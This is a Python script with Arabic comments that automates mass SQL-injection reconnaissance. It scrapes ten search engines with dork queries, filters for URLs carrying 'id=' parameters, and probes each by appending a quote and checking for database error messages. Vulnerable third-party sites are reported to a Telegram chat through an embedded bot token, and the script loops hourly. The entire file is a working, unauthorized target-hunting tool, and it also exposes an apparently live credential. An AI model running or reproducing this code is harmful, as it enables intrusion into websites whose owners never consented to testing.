# ===============================================
#  shadow_hunter_batch.py   (Pydroid-3 ready)
# ===============================================
#  * يقرأ dorks من sqli_dorks.txt
#  * 10محركات ×60صفحة (قابلة للتعديل)
#  * فلترة صارمة (domains + ext + keywords)
#  * كلما يجمع 30 رابط يفحصها مباشرة ويرسل النتائج
#  * يكرّر الدورة كل ساعة حتى إيقاف السكريبت
# -----------------------------------------------
#  pip install requests pyTelegramBotAPI
# ===============================================

import requests, re, time, itertools
from urllib.parse import quote_plus, urlparse
from telebot import TeleBot

# ---------- Telegram ----------
TOKEN   = "8054578360:AAE4-PAEetO-XSSU3-7cTCEEsGZ0MUOp78w"
CHAT_ID = "7856736153"
bot = TeleBot(TOKEN, threaded=False)

# ---------- search engines (10) ----------
ENGINES = {
    "bing"      : "https://www.bing.com/search?q={q}&first={start}",
    "brave"     : "https://search.brave.com/search?q={q}&offset={start}",
    "startpage" : "https://www.startpage.com/sp/search?query={q}&page={page}",
    "mojeek"    : "https://www.mojeek.com/search?q={q}&s={start}",
    "qwant"     : "https://www.qwant.com/?q={q}&start={start}",
    "ecosia"    : "https://www.ecosia.org/search?q={q}&p={page}",
    "searx_be"  : "https://searx.be/search?q={q}&p={page}",
    "searx_tie" : "https://searx.tiekoetter.com/search?q={q}&p={page}",
    "swisscows" : "https://swisscows.com/web?query={q}&page={page}",
    "ask"       : "https://www.ask.com/web?q={q}&page={page}"
}

PAGES_EACH = 60
HEADERS    = {"User-Agent": "Mozilla/5.0"}

# ---------- banned domains (100+) ----------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

# ---------- banned keywords ----------
BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

# ---------- banned extensions ----------
BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

# ---------- SQLi error signatures ----------
ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ---------- helpers ----------
def is_valid(url:str) -> bool:
    if "id=" not in url.lower(): return False
    if any(url.lower().endswith(ext) for ext in BANNED_EXTS): return False
    if any(k in url.lower() for k in BANNED_KEYWORDS): return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS): return False
    return True

def load_dorks(path:str="sqli_dorks.txt") -> list[str]:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print(f"[!] {path} غير موجود.")
        return []

def search_dork(dork:str) -> list[str]:
    q   = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            url = tmpl.format(q=q, start=page*10, page=page+1)
            try:
                html = requests.get(url, headers=HEADERS, timeout=10).text
                links = re.findall(r"https?://[^\s\"\'<>]+", html)
                out.extend(links)
            except Exception as e:
                print(f"    ⚠️ {name} خطأ: {e}")
    return out

def test_sqli(url:str) -> bool:
    try:
        r = requests.get(url+"'", timeout=8, headers=HEADERS)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except: return False

def send_batch_report(batch_id:int, scanned:int, infected_links:list[str]):
    msg = f"📝 Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"⚠️ SQLi: {link}")

# ---------- main cycle ----------
def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("🚀 بدء الجمع…")

    batch_id     = 1
    current_pool = []

    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean): continue
            if clean in current_pool: continue  # avoid duplicates inside batch
            current_pool.append(clean)

            # عندما نصل إلى 30 رابط نبدأ الفحص مباشرة
            if len(current_pool) == 30:
                print(f"🧪 Batch #{batch_id} – scanning 30 link(s)…")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()

    # أي روابط متبقية (<30)
    if current_pool:
        print(f"🧪 Batch #{batch_id} – scanning {len(current_pool)} link(s)…")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)

    bot.send_message(CHAT_ID, "✅ الدورة اكتملت. سأنتظر ساعة وأعيد الكرة.")

# ---------- hourly loop ----------
if __name__ == "__main__":
    while True:
        print("\n⏰ تشغيل جديد …")
        run_cycle()
        print("🕒 نوم 1 ساعة …")
        time.sleep(3600)
